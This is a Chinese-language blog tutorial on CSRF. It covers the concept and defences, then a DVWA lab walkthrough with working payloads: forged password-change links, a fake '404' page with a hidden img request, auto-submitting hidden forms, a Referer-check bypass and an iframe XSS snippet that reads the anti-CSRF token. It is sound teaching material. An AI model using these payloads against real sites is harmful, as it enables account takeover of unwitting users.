<!DOCTYPE html><html><head><meta name=generator content="Hexo 3.9.0"><meta charset=utf-8><title>从一些常见场景到CSRF漏洞利用 | qwzf</title><meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1"><meta name=keywords content="qwzf,Qwzf's Blog"><meta name=description content="本文首发于先知社区 0x00 前言闲来无事，开启了CSRF与SSRF漏洞的学习之旅。为什么要放一起学习呢？因为两者比较像，都是请求伪造。CSRF跨站请求伪造，SSRF服务器请求伪造。 0x01 CSRF漏洞简介对web客户端的攻击，除了XSS以外，还有一个非常重要的漏洞就是CSRF。CSRF最关键的是利用受害者的Cookie向服务器发送伪造请求。1.CSRF漏洞概念CSRF（Cross-site"><meta name=keywords content=BUG,CSRF><meta property=og:type content=article><meta property=og:title content=从一些常见场景到CSRF漏洞利用><meta property=og:url content=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/index.html><meta property=og:site_name content=qwzf><meta property=og:description content="本文首发于先知社区 0x00 前言闲来无事，开启了CSRF与SSRF漏洞的学习之旅。为什么要放一起学习呢？因为两者比较像，都是请求伪造。CSRF跨站请求伪造，SSRF服务器请求伪造。 0x01 CSRF漏洞简介对web客户端的攻击，除了XSS以外，还有一个非常重要的漏洞就是CSRF。CSRF最关键的是利用受害者的Cookie向服务器发送伪造请求。1.CSRF漏洞概念CSRF（Cross-site"><meta property=og:locale content=zh-CN><meta property=og:image content=http://img-blog.csdnimg.cn/20200225224153721.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020022521515875.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200225221415859.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200225233601119.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200225234942917.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200227014423206.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200227014738196.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020022600351295.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020022702394473.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200227024318123.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200227025241280.jpg><meta property=og:updated_time content=2020-03-15T15:41:45.610Z><meta name=twitter:card content=summary><meta name=twitter:title content=从一些常见场景到CSRF漏洞利用><meta name=twitter:description content="本文首发于先知社区 0x00 前言闲来无事，开启了CSRF与SSRF漏洞的学习之旅。为什么要放一起学习呢？因为两者比较像，都是请求伪造。CSRF跨站请求伪造，SSRF服务器请求伪造。 0x01 CSRF漏洞简介对web客户端的攻击，除了XSS以外，还有一个非常重要的漏洞就是CSRF。CSRF最关键的是利用受害者的Cookie向服务器发送伪造请求。1.CSRF漏洞概念CSRF（Cross-site"><meta name=twitter:image content=http://img-blog.csdnimg.cn/20200225224153721.jpg><link rel=icon href=/favicon.ico><link href=//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/css/style.css><script src=/js/pace.min.js></script></head></html><script src=https://g.joyinshare.com/hc/ribbon.min.js type=text/javascript></script><canvas class=fireworks style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas><script type=text/javascript src=//cdn.bootcss.com/animejs/2.2.0/anime.min.js></script><script type=text/javascript src=/js/clicklove.js></script><body><div id=container><header id=header><div id=banner></div><div id=header-outer><div id=header-menu class="header-menu-pos animated"><div class=header-menu-container><a href="/" class=left><span class=site-title>Qwzf&#39;s Blog</span></a><nav id=header-menu-nav class=right><a href="/"><i class="fa fa-home"></i> <span>Home</span></a> <a target=_blank href=/archives><i class="fa fa-archive"></i> <span>Archives</span></a> <a href=/about><i class="fa fa-user"></i> <span>About</span></a></nav><a class=mobile-header-menu-button><i class="fa fa-bars"></i></a></div></div><div id=header-row><div id=logo><a href="/"><img src=/images/logo.png alt=logo></a></div><div class=header-info><div id=header-title><h2>Qwzf&#39;s Blog</h2></div><div id=header-description><h3>一个爱学习的小白</h3></div></div><nav class=header-nav><div class=social><a title=qwzf target=_blank href=//qwzf.github.io><i class="fa fa-home fa-2x"></i></a> <a title=Github target=_blank href="//github.com/"><i class="fa fa-github fa-2x"></i></a> <a title=Weibo target=_blank href="//weibo.com/"><i class="fa fa-weibo fa-2x"></i></a> <a title=Twitter target=_blank href="//twitter.com/"><i class="fa fa-twitter fa-2x"></i></a></div></nav></div></div></header><div class=outer><section id=main class=body-wrap><article id=post-从一些常见场景到CSRF漏洞利用 class="article article-type-post" itemscope itemprop=blogPost><div class=article-inner><header class=article-header><h1 class=post-title itemprop=name>从一些常见场景到CSRF漏洞利用</h1><div class=post-title-bar><ul><li><i class="fa fa-book"></i> <span class=post-meta-item-text>分类:</span> <span class=post-count><a href="/categories/Web/">Web</a></span></li><li><i class="fa fa-calendar"></i> <span class=post-meta-item-text>日期:</span> <span class=post-count>2020-03-04</span></li><li><i class="fa fa-eye"></i> <span class=post-meta-item-text>阅读量:</span> <span id=busuanzi_value_page_pv>次</span></li><li><span class=post-time><span class=post-meta-item-icon><i class="fa fa-keyboard-o"></i> <span class=post-meta-item-text>字数统计:</span> <span class=post-count>2.9k字</span></span></span></li><li><span class=post-time><span class=post-meta-item-icon><i class="fa fa-hourglass-half"></i> <span class=post-meta-item-text>阅读时长:</span> <span class=post-count>11分</span></span></span></li></ul></div></header><div class="article-entry post-content" itemprop=articleBody><p><strong>本文首发于先知社区</strong></p><h3 id=0x00-前言><a href=#0x00-前言 class=headerlink title="0x00 前言"></a>0x00 前言</h3><p>闲来无事，开启了CSRF与SSRF漏洞的学习之旅。为什么要放一起学习呢？因为两者比较像，都是请求伪造。CSRF跨站请求伪造，SSRF服务器请求伪造。</p><h3 id=0x01-CSRF漏洞简介><a href=#0x01-CSRF漏洞简介 class=headerlink title="0x01 CSRF漏洞简介"></a>0x01 CSRF漏洞简介</h3><p>对web客户端的攻击，除了XSS以外，还有一个非常重要的漏洞就是CSRF。<br>CSRF最关键的是利用受害者的Cookie向服务器发送伪造请求。<br><strong>1.CSRF漏洞概念</strong><br>CSRF（Cross-site request forgery，跨站请求伪造），也被称为“One Click Attack”或Session Riding，通常缩写为CSRF或者XSRF，是基于客户端操作的请求伪造，是一种对网站的恶意利用。<br><strong>2.CSRF与XSS的区别</strong><br>CSRF听起来像跨站脚本攻击(XSS)，但与XSS不同。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。<br>什么意思呢？我的理解就是：<br>XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。<br><strong>3.CSRF漏洞原理</strong><br>学习过程中，参考了一下大师傅的博客，发现CSRF原理可以分为狭义的CSRF和广义的CSRF</p><ul><li>狭义的CSRF：是指在攻击者已经将代码植入受害用户的浏览器访问的页面的前提下，以“受害用户”的身份向服务端发起一个伪造的http请求，从而实现服务器<a href=https://baike.so.com/doc/1102143-1166199.html target=_blank rel=noopener>CURD</a>来执行读写操作。</li><li>广义的CSRF：<br>就是攻击者将一个http接口中需要传递的所有参数都预测出来，然后不管以什么方式，都可以来任意调用你的接口，对服务器实现CURD</li></ul><p><strong>4.CSRF攻击流程</strong><br><img src=http://img-blog.csdnimg.cn/20200225224153721.jpg alt=在这里插入图片描述></p><ol><li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站bA；</li><li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li><li>用户未退出网站A之前，在同一浏览器中，打开一个标签页访问恶意网站B；</li><li>恶意网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求访问第三方站点A；</li><li>浏览器在接收到这些攻击性代码后，根据恶意网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自恶意网站B的恶意代码被执行。</li></ol><p><strong>5.CSRF攻击实现的条件</strong></p><ul><li>登录受信任站点WebA，并在本地生成Cookie。</li><li>在不登出WebA的情况下，访问站点WebB。</li></ul><h3 id=0x02-常见CSRF攻击类型><a href=#0x02-常见CSRF攻击类型 class=headerlink title="0x02 常见CSRF攻击类型"></a>0x02 常见CSRF攻击类型</h3><p>常见CSRF攻击类型有：GET型CSRF、POST型CSRF<br>下面使用必火团队的CSRF在线靶场进行验证。<a href=https://www.nanhack.com/payload/xss/csrf1.php target=_blank rel=noopener>靶场地址</a><br><strong>GET型</strong><br>仅需要一个HTTP请求。就能够构造一次简单的CSRF。<br><img src=http://img-blog.csdnimg.cn/2020022521515875.jpg alt=在这里插入图片描述></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>银行站点,正常GET请求来完毕银行转账给admin的<span class=number>10</span>元操作：</span><br><span class=line>http:<span class=comment>//www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10</span></span><br><span class=line>恶意攻击者页面：http:<span class=comment>//www.nanhack.com/payload/xss/csrf1.php</span></span><br><span class=line>访问恶意攻击者页面产生CSRF请求：</span><br><span class=line>http:<span class=comment>//www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000</span></span><br></pre></td></tr></table></figure><p>用户登录了银行站点，然后访问恶意攻击者页面，这时qwzf的银行账户少了1000。<br><img src=http://img-blog.csdnimg.cn/20200225221415859.jpg alt=在这里插入图片描述><br>原因：银行站点A违反了HTTP规范，使用GET请求更新资源。<br>用户在访问恶意攻击者页面之前，已经登录了银行站点，而攻击者页面中的 一个合法的请求，但这里被不法分子利用了。<br>浏览器会带上银行站点的Cookie发出Get请求，去获取资源以GET的方式请求第三方资源（这里的第三方就是指银行站点了，这里是<code>https://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000</code> ，结果银行站点服务器收到请求后，认为这是一个更新资源操作(转账操作)，所以就立马进行转账操作。从而qwzf的银行账户转账给zsm账户1000元。<br>直接构造CSRF链接，隐蔽性太低。于是可以采用标签等方法进行隐藏。<br><em>4种GET型CSRF构造方式</em></p><ol><li>链接利用(a标签)</li><li>iframe利用<br>可以设置iframe的style为display:none，以此来不显示iframe加载的内容</li><li>img标签利用<br>img标签内的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求</li><li>background利用<br>可以利用CSS中background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</li></ol><p><strong>POST型</strong><br>危害没有GET型的大，利用通常使用的是一个自动提交的表单。如：</p><figure class="highlight html"><table><tr><td class=code><pre><span class=line><span class=tag>&lt;<span class=name>form</span> <span class=attr>name</span>=<span class=string>"csrf"</span> <span class=attr>action</span>=<span class=string>"http://edu.xss.tv/payload/xss/csrf2.php"</span> <span class=attr>method</span>=<span class=string>"post"</span>&gt;</span></span><br><span class=line>    <span class=tag>&lt;<span class=name>input</span> <span class=attr>type</span>=<span class=string>"hidden"</span> <span class=attr>name</span>=<span class=string>"name"</span> <span class=attr>value</span>=<span class=string>"zhangsan"</span>&gt;</span></span><br><span class=line>    <span class=tag>&lt;<span class=name>input</span> <span class=attr>type</span>=<span class=string>"hidden"</span> <span class=attr>name</span>=<span class=string>"money"</span> <span class=attr>value</span>=<span class=string>"1000"</span>&gt;</span></span><br><span class=line><span class=tag>&lt;/<span class=name>form</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>script</span> <span class=attr>type</span>=<span class=string>"text/javascript"</span>&gt;</span><span class=javascript><span class=built_in>document</span>.csrf.submit();</span><span class=tag>&lt;/<span class=name>script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><h3 id=0x03-CSRF漏洞探测><a href=#0x03-CSRF漏洞探测 class=headerlink title="0x03 CSRF漏洞探测"></a>0x03 CSRF漏洞探测</h3><p>利用自动化探测工具<code>CSRFTester</code>或者burp自带<code>CSRF POC</code><br>1.CSRFTester设置浏览器代理:127.0.0.1:8008，burp是8080<br>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞<br>3.生成CSRF的POC<br>参考：<a href=https://xz.aliyun.com/t/6128#toc-7 target=_blank rel=noopener>Web安全Day3 - CSRF实战攻防</a></p><h3 id=0x04-CSRF漏洞防御><a href=#0x04-CSRF漏洞防御 class=headerlink title="0x04 CSRF漏洞防御"></a>0x04 CSRF漏洞防御</h3><ul><li>设置和判断cookie时采用hash值认证。</li><li>尽量采用post类型传参，这就减少了请求被直接伪造的可能。</li><li>验证HTTP Referer字段</li><li>在 HTTP 头中自定义属性并验证</li><li>在请求地址中添加token并验证</li><li>采用验证码判断，进行防御。</li></ul><h3 id=0x05-DVWA靶场CSRF练习><a href=#0x05-DVWA靶场CSRF练习 class=headerlink title="0x05 DVWA靶场CSRF练习"></a>0x05 DVWA靶场CSRF练习</h3><p>首先，先登录DVWA，以在浏览器上保存Cookie信息。用户名：admin 密码：password</p><h4 id=1-Low级><a href=#1-Low级 class=headerlink title=1.Low级></a>1.Low级</h4><p>查看下源码(这里只写一些关键代码)：</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=meta>&lt;?php</span>   </span><br><span class=line><span class=keyword>if</span> (<span class=keyword>isset</span>($_GET[<span class=string>'Change'</span>])) &#123;</span><br><span class=line>    <span class=comment>//获取两次密码输入</span></span><br><span class=line>    $pass_new = $_GET[<span class=string>'password_new'</span>];   </span><br><span class=line>    $pass_conf = $_GET[<span class=string>'password_conf'</span>];</span><br><span class=line>    <span class=keyword>if</span> (($pass_new == $pass_conf))&#123;   </span><br><span class=line>        $pass_new = mysql_real_escape_string($pass_new); <span class=comment>//过滤字符串</span></span><br><span class=line>        $pass_new = md5($pass_new);</span><br><span class=line>        $insert=<span class=string>"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';"</span>;   </span><br><span class=line>        $result=mysql_query($insert) <span class=keyword>or</span> <span class=keyword>die</span>(<span class=string>'&lt;pre&gt;'</span> . mysql_error() . <span class=string>'&lt;/pre&gt;'</span> );        </span><br><span class=line>        <span class=keyword>echo</span> <span class=string>"&lt;pre&gt; Password Changed &lt;/pre&gt;"</span>;           </span><br><span class=line>        mysql_close();   </span><br><span class=line>    &#125; </span><br><span class=line>    <span class=keyword>else</span>&#123;           </span><br><span class=line>        <span class=keyword>echo</span> <span class=string>"&lt;pre&gt; Passwords did not match. &lt;/pre&gt;"</span>;               </span><br><span class=line>    &#125; </span><br><span class=line>&#125;   </span><br><span class=line><span class=meta>?&gt;</span></span><br></pre></td></tr></table></figure><p>首先获取输入的两个密码然后判断两个值是否相等，若相等则接着对<code>pass_new</code>变量进行调用<code>mysql_real_escape_string()</code>函数来进行字符串的过滤、再调用md5()函数对输入的密码进行MD5加密，最后再将新密码更新到数据库中。整段代码因为调用了<code>mysql_real_escape_string()</code>函数从而有效地过滤了SQL注入，但是对CSRF没有任何的防御机制。(当然服务器对请求的发送者是做了身份验证的，检查Cookie，只是这里代码没有体现)</p><h4 id=Low级漏洞利用><a href=#Low级漏洞利用 class=headerlink title=Low级漏洞利用></a>Low级漏洞利用</h4><p>正常修改密码：</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>http:<span class=comment>//192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</span></span><br></pre></td></tr></table></figure><p><strong>（1）直接构造链接</strong></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>http:<span class=comment>//192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=qwzf&amp;password_conf=qwzf&amp;Change=Change#</span></span><br></pre></td></tr></table></figure><p>当受害者点击这个链接，他的密码就会被改成qwzf（这种构造一眼就能看出来是改密码，隐蔽性太低）<br><img src=http://img-blog.csdnimg.cn/20200225233601119.jpg alt=在这里插入图片描述><br><strong>（2）使用短链接来隐藏URL</strong><br>生成短链接常用网址：<br><a href=http://tool.chinaz.com/tools/dwz.aspx target=_blank rel=noopener>站长工具</a><br><a href="http://dwz.cn/" target=_blank rel=noopener>百度短网址</a><br><img src=http://img-blog.csdnimg.cn/20200225234942917.jpg alt=在这里插入图片描述><br>点击短链接，会自动跳转到真实网站。在实际攻击场景下只要目标服务器的域名不是ip，并且是远程服务器。<br><strong>（3）构造攻击页面</strong><br>通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，然后在公网上传下面这个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里我写一个qwzf.html：</p><figure class="highlight html"><table><tr><td class=code><pre><span class=line><span class=tag>&lt;<span class=name>html</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>head</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>title</span>&gt;</span>404 Not Found<span class=tag>&lt;/<span class=name>title</span>&gt;</span></span><br><span class=line><span class=tag>&lt;/<span class=name>head</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>body</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>h1</span>&gt;</span>Not Found<span class=tag>&lt;/<span class=name>h1</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>img</span> <span class=attr>src</span>=<span class=string>"http://192.168.1.3/DVWA/vulnerabilities/csrf/?password_new=qwzf&amp;password_conf=qwzf&amp;Change=Change#"</span> <span class=attr>border</span>=<span class=string>"0"</span> <span class=attr>style</span>=<span class=string>"display:none;"</span>/&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>p</span>&gt;</span>The requested URL /qwzf.html was not found on this server.<span class=tag>&lt;/<span class=name>p</span>&gt;</span></span><br><span class=line><span class=tag>&lt;/<span class=name>body</span>&gt;</span></span><br><span class=line><span class=tag>&lt;/<span class=name>html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户访问qwzf.html时，会误认为是自己访问一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了qwzf。<br><img src=http://img-blog.csdnimg.cn/20200227014423206.jpg alt=在这里插入图片描述></p><h4 id=2-Medium级><a href=#2-Medium级 class=headerlink title=2.Medium级></a>2.Medium级</h4><p>查看源码发现，比Low级多了个if判断</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=keyword>if</span>( <span class=keyword>isset</span>( $_GET[ <span class=string>'Change'</span> ] ) ) &#123; </span><br><span class=line>    <span class=comment>// Checks to see where the request came from </span></span><br><span class=line>    <span class=keyword>if</span>( eregi( $_SERVER[ <span class=string>'SERVER_NAME'</span> ], $_SERVER[ <span class=string>'HTTP_REFERER'</span> ] ) ) &#123;</span><br></pre></td></tr></table></figure><p><code>eregi(string pattern, string string)</code><br>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。<br>同时可以看到，Medium级的代码检查了保留变量 <code>HTTP_REFERER</code>(http包头的Referer参数的值，表示来源地址）中是否包含<code>SERVER_NAME</code>(http包头的Host参数，及要访问的主机名，这里是192.168.1.3)，希望通过这种机制抵御CSRF攻击。</p><h4 id=Medium级漏洞利用><a href=#Medium级漏洞利用 class=headerlink title=Medium级漏洞利用></a>Medium级漏洞利用</h4><p>将之前<code>qwzf.html</code>攻击页面命名为<code>192.168.1.3.html</code>，然后放置在攻击者的服务器里，这里是<code>http://39.x.93.165:8080/</code><br><img src=http://img-blog.csdnimg.cn/20200227014738196.jpg alt=在这里插入图片描述><br>Referer参数绕过过滤规则<br><img src=http://img-blog.csdnimg.cn/2020022600351295.jpg alt=在这里插入图片描述><br>密码被修改为了qwzf</p><h4 id=3-High级><a href=#3-High级 class=headerlink title=3.High级></a>3.High级</h4><p>查看源码发现，比Low级多了随机token</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=keyword>if</span>( <span class=keyword>isset</span>( $_GET[ <span class=string>'Change'</span> ] ) ) &#123; </span><br><span class=line>    <span class=comment>// Check Anti-CSRF token </span></span><br><span class=line>    checkToken( $_REQUEST[ <span class=string>'user_token'</span> ], $_SESSION[ <span class=string>'session_token'</span> ], <span class=string>'index.php'</span> ); </span><br><span class=line>    ......</span><br><span class=line>&#125;</span><br><span class=line><span class=comment>// Generate Anti-CSRF token </span></span><br><span class=line>generateSessionToken();</span><br></pre></td></tr></table></figure><p>High级的代码加入了Anti-CSRF token机制，即用户每次访问改密页面时，服务器会返回一个<code>随机的token</code>。<br>向服务器发起请求时，需要提交token参数。<br>而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><code>暴力破解可以突破CSRF Token</code><br>原因：构造HTTP请求的对象不一样。暴力破解，攻击者是当前用户，受害者是其他用户。CSRF攻击者是其他用户，受害者是当前用户。</p><h4 id=High级漏洞利用><a href=#High级漏洞利用 class=headerlink title=High级漏洞利用></a>High级漏洞利用</h4><p>绕过反CSRF机制，关键是要<code>获取token</code>，要利用受害者的cookie去修改密码的页面获取关键的token。<br>可不可以在自己的恶意页面中运行js脚本而取得目标页面的token呢？当然是不可以，浏览器普遍对跨域请求资源有访问控制。对于需要验证的资源，跨域请求会被拒绝。<br>但是如果同时存在存储xss漏洞的话，可进行csrf利用。<br>（1）首先我们需要先获取用户token，由于现在都已经不支持跨域请求访问了，所以只能从别的地方入手获取token，查看大师傅博客，发现可以利用下面的脚本在XSS(Stored)的Name参数进行XSS攻击，获取用户token：</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>&lt;iframe src=<span class=string>"../csrf"</span> onload=alert(frames[<span class=number>0</span>].document.getElementsByName(<span class=string>'user_token'</span>)[<span class=number>0</span>].value)&gt;</span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/2020022702394473.jpg alt=在这里插入图片描述><br><img src=http://img-blog.csdnimg.cn/20200227024318123.jpg alt=在这里插入图片描述><br>（2）然后将下面的脚本构造攻击页面放到攻击服务器上，诱导用户点击，从而实现攻击<br>csrf.html</p><figure class="highlight html"><table><tr><td class=code><pre><span class=line><span class=tag>&lt;<span class=name>script</span> <span class=attr>type</span>=<span class=string>"text/javascript"</span>&gt;</span></span><br><span class=line><span class=actionscript>    <span class=function><span class=keyword>function</span> <span class=title>attack</span><span class=params>()</span></span></span></span><br><span class=line>    &#123;</span><br><span class=line><span class=javascript>        <span class=built_in>document</span>.getElementById(<span class=string>"transfer"</span>).submit(); </span></span><br><span class=line>    &#125;</span><br><span class=line><span class=tag>&lt;/<span class=name>script</span>&gt;</span></span><br><span class=line><span class=tag>&lt;<span class=name>body</span> ο<span class=attr>nl</span>ο<span class=attr>ad</span>=<span class=string>"attack()"</span>&gt;</span></span><br><span class=line>    <span class=tag>&lt;<span class=name>form</span> <span class=attr>method</span>=<span class=string>"GET"</span> <span class=attr>id</span>=<span class=string>"transfer"</span> <span class=attr>action</span>=<span class=string>"http://192.168.1.3/dvwa/vulnerabilities/csrf"</span>&gt;</span></span><br><span class=line>        <span class=tag>&lt;<span class=name>input</span> <span class=attr>type</span>=<span class=string>"hidden"</span> <span class=attr>name</span>=<span class=string>"password_new"</span> <span class=attr>value</span>=<span class=string>"qwzf"</span>&gt;</span></span><br><span class=line>        <span class=tag>&lt;<span class=name>input</span> <span class=attr>type</span>=<span class=string>"hidden"</span> <span class=attr>name</span>=<span class=string>"password_conf"</span> <span class=attr>value</span>=<span class=string>"qwzf"</span>&gt;</span></span><br><span class=line>        <span class=tag>&lt;<span class=name>input</span> <span class=attr>type</span>=<span class=string>'hidden'</span> <span class=attr>name</span>=<span class=string>'user_token'</span> <span class=attr>value</span>=<span class=string>"8519d07c0e08e8ef0461311e9a880af5"</span>&gt;</span></span><br><span class=line>        <span class=tag>&lt;<span class=name>input</span> <span class=attr>type</span>=<span class=string>"hidden"</span> <span class=attr>name</span>=<span class=string>"Change"</span> <span class=attr>value</span>=<span class=string>"Change"</span>&gt;</span></span><br><span class=line>    <span class=tag>&lt;/<span class=name>form</span>&gt;</span></span><br><span class=line><span class=tag>&lt;/<span class=name>body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/20200227025241280.jpg alt=在这里插入图片描述><br>另外high级还有一种大师傅发现的方法，参考大师傅博客：<br><a href=https://www.sohu.com/a/314777870_354899 target=_blank rel=noopener>DVWA 1.10 High等级的CSRF另类通关法</a></p><h3 id=0x06-后记><a href=#0x06-后记 class=headerlink title="0x06 后记"></a>0x06 后记</h3><p>通过学习CSRF漏洞，感觉Web安全竟如此有趣，继续加油！！！</p><div class=post-copyright><div class=content><p>最后更新： 2020年03月15日 23:41</p><p>原始链接： <a class=post-url href="/2020/03/04/从一些常见场景到CSRF漏洞利用/" title=从一些常见场景到CSRF漏洞利用>https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/</a></p><footer><a href=https://qwzf.github.io><img src=/images/logo.png alt=qwzf> qwzf</a></footer></div></div><div class=page-reward><a id=rewardBtn href=javascript:;>赏</a></div><div id=reward class="post-modal reward-lay"><a class=close href=javascript:; id=reward-close>×</a> <span class=reward-title><i class="icon icon-quote-left"></i> 请我吃糖~ <i class="icon icon-quote-right"></i></span><div class=reward-content><div class=reward-code><img id=rewardCode src=/images/wechat_code.jpg alt=打赏二维码></div><div class=reward-select><label class="reward-select-item checked" data-id=wechat data-wechat=/images/wechat_code.jpg><img class=reward-select-item-wechat src=/images/wechat.png alt=微信></label> <label class=reward-select-item data-id=alipay data-alipay=/images/alipay_code.jpg><img class=reward-select-item-alipay src=/images/alipay.png alt=支付宝></label></div></div></div></div><footer class=article-footer><div class=post-share><a href=javascript:; id=share-sub class=post-share-fab><i class="fa fa-share-alt"></i></a><div class=post-share-list id=share-list><ul class=share-icons><li><a class="weibo share-sns" target=_blank href="http://service.weibo.com/share/share.php?url=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/&title=《从一些常见场景到CSRF漏洞利用》 — qwzf&pic=http://img-blog.csdnimg.cn/20200225224153721.jpg" data-title=微博><i class="fa fa-weibo"></i></a></li><li><a class="weixin share-sns" id=wxFab href=javascript:; data-title=微信><i class="fa fa-weixin"></i></a></li><li><a class="qq share-sns" target=_blank href="http://connect.qq.com/widget/shareqq/index.html?url=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/&title=《从一些常见场景到CSRF漏洞利用》 — qwzf&source=" data-title=QQ><i class="fa fa-qq"></i></a></li><li><a class="facebook share-sns" target=_blank href="https://www.facebook.com/sharer/sharer.php?u=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/" data-title=Facebook><i class="fa fa-facebook"></i></a></li><li><a class="twitter share-sns" target=_blank href="https://twitter.com/intent/tweet?text=《从一些常见场景到CSRF漏洞利用》 — qwzf&url=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/&via=https://qwzf.github.io" data-title=Twitter><i class="fa fa-twitter"></i></a></li><li><a class="google share-sns" target=_blank href="https://plus.google.com/share?url=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/" data-title=Google+><i class="fa fa-google-plus"></i></a></li></ul></div></div><div class="post-modal wx-share" id=wxShare><a class=close href=javascript:; id=wxShare-close>×</a><p>扫一扫，分享到微信</p><img src="//api.qrserver.com/v1/create-qr-code/?data=https://qwzf.github.io/2020/03/04/从一些常见场景到CSRF漏洞利用/" alt=微信分享二维码></div><div class=mask></div><ul class=article-footer-menu><li class=article-footer-tags><i class="fa fa-tags"></i> <a href="/tags/BUG/" class=color4>BUG</a> <a href="/tags/CSRF/" class=color5>CSRF</a></li></ul></footer></div></article><aside class="post-toc-pos post-toc-top" id=post-toc><nav class=post-toc-wrap><ol class=post-toc><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x00-前言><span class=post-toc-text>0x00 前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x01-CSRF漏洞简介><span class=post-toc-text>0x01 CSRF漏洞简介</span></a></li><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x02-常见CSRF攻击类型><span class=post-toc-text>0x02 常见CSRF攻击类型</span></a></li><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x03-CSRF漏洞探测><span class=post-toc-text>0x03 CSRF漏洞探测</span></a></li><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x04-CSRF漏洞防御><span class=post-toc-text>0x04 CSRF漏洞防御</span></a></li><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x05-DVWA靶场CSRF练习><span class=post-toc-text>0x05 DVWA靶场CSRF练习</span></a><ol class=post-toc-child><li class="post-toc-item post-toc-level-4"><a class=post-toc-link href=#1-Low级><span class=post-toc-text>1.Low级</span></a></li><li class="post-toc-item post-toc-level-4"><a class=post-toc-link href=#Low级漏洞利用><span class=post-toc-text>Low级漏洞利用</span></a></li><li class="post-toc-item post-toc-level-4"><a class=post-toc-link href=#2-Medium级><span class=post-toc-text>2.Medium级</span></a></li><li class="post-toc-item post-toc-level-4"><a class=post-toc-link href=#Medium级漏洞利用><span class=post-toc-text>Medium级漏洞利用</span></a></li><li class="post-toc-item post-toc-level-4"><a class=post-toc-link href=#3-High级><span class=post-toc-text>3.High级</span></a></li><li class="post-toc-item post-toc-level-4"><a class=post-toc-link href=#High级漏洞利用><span class=post-toc-text>High级漏洞利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#0x06-后记><span class=post-toc-text>0x06 后记</span></a></li></ol></nav></aside><nav id=article-nav><a href="/2020/03/11/Centos-DHCP、FTP和DNS搭建与配置/" id=article-nav-newer class=article-nav-link-wrap><span class=article-nav-title><i class="fa fa-hand-o-left" aria-hidden=true></i> Centos-DHCP、FTP和DNS搭建与配置</span></a> <a href="/2020/02/20/Python学习-网络爬虫(一)/" id=article-nav-older class=article-nav-link-wrap><span class=article-nav-title>Python学习-网络爬虫(一)</span> <i class="fa fa-hand-o-right" 